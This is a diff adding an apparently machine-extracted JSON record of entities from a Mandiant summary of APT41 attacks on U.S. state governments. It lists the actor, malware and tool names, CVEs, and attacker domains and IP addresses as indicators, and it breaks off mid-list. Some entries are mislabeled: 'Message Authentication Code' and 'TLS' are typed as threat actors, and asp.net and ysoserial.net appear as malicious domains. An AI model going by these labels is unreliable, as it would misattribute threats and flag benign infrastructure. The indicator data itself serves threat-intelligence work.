@@ -1,0 +1,3549 @@
+{
+  "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+  "title": "Does This Look Infected? A Summary of APT41 Targeting U.S. State Governments",
+  "source": "Mandiant",
+  "published_date": null,
+  "report_metadata": {
+    "file_name": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022).pdf",
+    "file_path": "/root/APTtext/Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022).pdf",
+    "source_type": "pdf",
+    "char_length": 27831,
+    "report_profile": "narrative_cti"
+  },
+  "entities": [
+    {
+      "id": "ent_threatactor_APT41",
+      "type": "ThreatActor",
+      "name": "APT41",
+      "normalized_name": "APT41",
+      "aliases": [],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_12",
+        "ev_3",
+        "ev_44",
+        "ev_73"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_44",
+      "supporting_evidence_ids": [
+        "ev_73",
+        "ev_12",
+        "ev_3"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_threatactor_Message_Authentication_Code",
+      "type": "ThreatActor",
+      "name": "Message Authentication Code",
+      "normalized_name": "Message Authentication Code",
+      "aliases": [
+        "MAC"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_20",
+        "ev_23",
+        "ev_36",
+        "ev_37"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_20",
+      "supporting_evidence_ids": [
+        "ev_23",
+        "ev_36",
+        "ev_37"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_BEACON",
+      "type": "Malware",
+      "name": "BEACON",
+      "normalized_name": "BEACON",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_58"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "family": "BEACON",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_58",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_Cobalt_Strike_BEACON",
+      "type": "Malware",
+      "name": "Cobalt Strike BEACON",
+      "normalized_name": "Cobalt Strike BEACON",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_58"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "family": "Cobalt Strike BEACON",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_58",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_DUSTPAN",
+      "type": "Malware",
+      "name": "DUSTPAN",
+      "normalized_name": "DUSTPAN",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_56",
+        "ev_57",
+        "ev_58"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "family": "DUSTPAN",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_58",
+      "supporting_evidence_ids": [
+        "ev_57",
+        "ev_56"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_tool_Dsquery",
+      "type": "Tool",
+      "name": "Dsquery",
+      "normalized_name": "Dsquery",
+      "aliases": [
+        "dsquery.dll"
+      ],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_121",
+        "ev_54"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_121",
+      "supporting_evidence_ids": [
+        "ev_54"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "derived_from_file_id": "ent_file_dsquery.dll",
+      "tool_name": "Dsquery",
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_campaign_State_Government_Campaign",
+      "type": "Campaign",
+      "name": "State Government Campaign",
+      "normalized_name": "State Government Campaign",
+      "aliases": [],
+      "confidence": 0.9,
+      "evidence_ids": [
+        "ev_112",
+        "ev_44",
+        "ev_76"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": "ev_44",
+      "supporting_evidence_ids": [
+        "ev_76",
+        "ev_112"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_cve_CVE-2020-0688",
+      "type": "CVE",
+      "name": "CVE-2020-0688",
+      "normalized_name": "CVE-2020-0688",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_36"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_36",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_cve_CVE-2021-44207",
+      "type": "CVE",
+      "name": "CVE-2021-44207",
+      "normalized_name": "CVE-2021-44207",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_116"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_116",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_cve_CVE-2021-44228",
+      "type": "CVE",
+      "name": "CVE-2021-44228",
+      "normalized_name": "CVE-2021-44228",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_117",
+        "ev_142"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_117",
+      "supporting_evidence_ids": [
+        "ev_142"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_domain_asp.net",
+      "type": "Domain",
+      "name": "asp.net",
+      "normalized_name": "asp.net",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_17",
+        "ev_35",
+        "ev_37",
+        "ev_6"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "asp.net",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_6",
+      "supporting_evidence_ids": [
+        "ev_35",
+        "ev_37",
+        "ev_17"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_victim_U.S._state_government",
+      "type": "Victim",
+      "name": "U.S. state government",
+      "normalized_name": "U.S. state government",
+      "aliases": [],
+      "confidence": 0.88,
+      "evidence_ids": [],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": null,
+      "supporting_evidence_ids": [],
+      "needs_review": true,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_victim_U.S._state_government_networks",
+      "type": "Victim",
+      "name": "U.S. state government networks",
+      "normalized_name": "U.S. state government networks",
+      "aliases": [],
+      "confidence": 0.88,
+      "evidence_ids": [],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": null,
+      "supporting_evidence_ids": [],
+      "needs_review": true,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    }
+  ],
+  "observations": [
+    {
+      "id": "ent_threatactor_MAC",
+      "type": "ThreatActor",
+      "name": "MAC",
+      "normalized_name": "MAC",
+      "aliases": [],
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_20",
+        "ev_23",
+        "ev_36"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_threatactor_Message_Authentication_Code"
+    },
+    {
+      "id": "ent_threatactor_TLS",
+      "type": "ThreatActor",
+      "name": "TLS",
+      "normalized_name": "TLS",
+      "aliases": [
+        "WSS"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_106",
+        "ev_110",
+        "ev_43"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_106",
+      "supporting_evidence_ids": [
+        "ev_43",
+        "ev_110"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_tool_BadPotato",
+      "type": "Tool",
+      "name": "BadPotato",
+      "normalized_name": "BadPotato",
+      "aliases": [],
+      "confidence": 0.91,
+      "evidence_ids": [
+        "ev_114",
+        "ev_137"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_114",
+      "supporting_evidence_ids": [
+        "ev_137"
+      ],
+      "needs_review": false,
+      "tool_name": "BadPotato",
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_tool_Cobalt_Strike",
+      "type": "Tool",
+      "name": "Cobalt Strike",
+      "normalized_name": "Cobalt Strike",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_58"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_58",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "tool_name": "Cobalt Strike",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_file_dsquery.dll",
+      "type": "File",
+      "name": "dsquery.dll",
+      "normalized_name": "dsquery.dll",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_121",
+        "ev_54"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "file_name": "dsquery.dll",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_121",
+      "supporting_evidence_ids": [
+        "ev_54"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "conflict_demoted"
+    },
+    {
+      "id": "ent_tool_dsquery.dll",
+      "type": "Tool",
+      "name": "dsquery.dll",
+      "normalized_name": "dsquery.dll",
+      "aliases": [],
+      "confidence": 0.84,
+      "evidence_ids": [
+        "ev_121",
+        "ev_54"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_tool_Dsquery"
+    },
+    {
+      "id": "ent_campaign_USAHerds",
+      "type": "Campaign",
+      "name": "USAHerds",
+      "normalized_name": "USAHerds",
+      "aliases": [],
+      "confidence": 0.9,
+      "evidence_ids": [
+        "ev_2",
+        "ev_35",
+        "ev_36",
+        "ev_89"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "sources": [
+        "llm",
+        "title_derive"
+      ],
+      "primary_evidence_id": "ev_35",
+      "supporting_evidence_ids": [
+        "ev_36",
+        "ev_89",
+        "ev_2"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "historical_context"
+    },
+    {
+      "id": "ent_domain_afdentry.workstation.eu.org",
+      "type": "Domain",
+      "name": "afdentry.workstation.eu.org",
+      "normalized_name": "afdentry.workstation.eu.org",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_110",
+        "ev_112",
+        "ev_141"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "afdentry.workstation.eu.org",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_141",
+      "supporting_evidence_ids": [
+        "ev_110",
+        "ev_112"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_cdn.ns.time12.cf",
+      "type": "Domain",
+      "name": "cdn.ns.time12.cf",
+      "normalized_name": "cdn.ns.time12.cf",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "cdn.ns.time12.cf",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_down-flash.com",
+      "type": "Domain",
+      "name": "down-flash.com",
+      "normalized_name": "down-flash.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_113"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "down-flash.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_113",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_east.winsproxy.com",
+      "type": "Domain",
+      "name": "east.winsproxy.com",
+      "normalized_name": "east.winsproxy.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "east.winsproxy.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_libxqagv.ns.dns3.cf",
+      "type": "Domain",
+      "name": "libxqagv.ns.dns3.cf",
+      "normalized_name": "libxqagv.ns.dns3.cf",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_113"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "libxqagv.ns.dns3.cf",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_113",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_microsoftfile.com",
+      "type": "Domain",
+      "name": "microsoftfile.com",
+      "normalized_name": "microsoftfile.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_113"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "microsoftfile.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_113",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_ns.time12.cf",
+      "type": "Domain",
+      "name": "ns.time12.cf",
+      "normalized_name": "ns.time12.cf",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_132",
+        "ev_133",
+        "ev_139",
+        "ev_99"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "ns.time12.cf",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_132",
+      "supporting_evidence_ids": [
+        "ev_133",
+        "ev_139",
+        "ev_99"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_ns1.entrydns.eu.org",
+      "type": "Domain",
+      "name": "ns1.entrydns.eu.org",
+      "normalized_name": "ns1.entrydns.eu.org",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "ns1.entrydns.eu.org",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_subnet.milli-seconds.com",
+      "type": "Domain",
+      "name": "subnet.milli-seconds.com",
+      "normalized_name": "subnet.milli-seconds.com",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "subnet.milli-seconds.com",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_work.queryip.cf",
+      "type": "Domain",
+      "name": "work.queryip.cf",
+      "normalized_name": "work.queryip.cf",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "work.queryip.cf",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_work.viewdns.ml",
+      "type": "Domain",
+      "name": "work.viewdns.ml",
+      "normalized_name": "work.viewdns.ml",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "work.viewdns.ml",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_domain_ysoserial.net",
+      "type": "Domain",
+      "name": "ysoserial.net",
+      "normalized_name": "ysoserial.net",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_24",
+        "ev_30"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "ysoserial.net",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_30",
+      "supporting_evidence_ids": [
+        "ev_24"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_ipv4_103.238.225.37",
+      "type": "IPv4",
+      "name": "103.238.225.37",
+      "normalized_name": "103.238.225.37",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_113",
+        "ev_142"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "103.238.225.37",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_142",
+      "supporting_evidence_ids": [
+        "ev_113"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_104.18.6.251",
+      "type": "IPv4",
+      "name": "104.18.6.251",
+      "normalized_name": "104.18.6.251",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "104.18.6.251",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_104.18.7.251",
+      "type": "IPv4",
+      "name": "104.18.7.251",
+      "normalized_name": "104.18.7.251",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "104.18.7.251",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_107.172.210.69",
+      "type": "IPv4",
+      "name": "107.172.210.69",
+      "normalized_name": "107.172.210.69",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "107.172.210.69",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_149.28.15.152",
+      "type": "IPv4",
+      "name": "149.28.15.152",
+      "normalized_name": "149.28.15.152",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "149.28.15.152",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_172.104.206.48",
+      "type": "IPv4",
+      "name": "172.104.206.48",
+      "normalized_name": "172.104.206.48",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "172.104.206.48",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_18.118.56.237",
+      "type": "IPv4",
+      "name": "18.118.56.237",
+      "normalized_name": "18.118.56.237",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "18.118.56.237",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_182.239.92.31",
+      "type": "IPv4",
+      "name": "182.239.92.31",
+      "normalized_name": "182.239.92.31",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_113"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "182.239.92.31",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_113",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_185.118.167.40",
+      "type": "IPv4",
+      "name": "185.118.167.40",
+      "normalized_name": "185.118.167.40",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "185.118.167.40",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_194.156.98.12",
+      "type": "IPv4",
+      "name": "194.156.98.12",
+      "normalized_name": "194.156.98.12",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "194.156.98.12",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_194.195.125.121",
+      "type": "IPv4",
+      "name": "194.195.125.121",
+      "normalized_name": "194.195.125.121",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "194.195.125.121",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "invalid_ioc"
+    },
+    {
+      "id": "ent_ipv4_20.121.42.11",
+      "type": "IPv4",
+      "name": "20.121.42.11",
+      "normalized_name": "20.121.42.11",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_112"
+      ],
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "value": "20.121.42.11",
+      "ioc_type": "ipv4",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_112",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
